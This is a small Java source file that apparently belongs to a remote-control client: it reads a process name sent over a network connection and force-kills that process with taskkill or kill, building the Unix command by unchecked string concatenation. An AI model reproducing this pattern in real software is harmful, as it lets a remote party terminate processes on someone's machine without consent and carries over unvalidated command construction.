package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.common.os.OperatingSystem;

public class PacketKILLPROCESS extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		String process = Connection.readLine();
		
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec(new String[] { "taskkill", "/f", "/im", process });
			} else {
				Runtime.getRuntime().exec("kill " + process);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

}
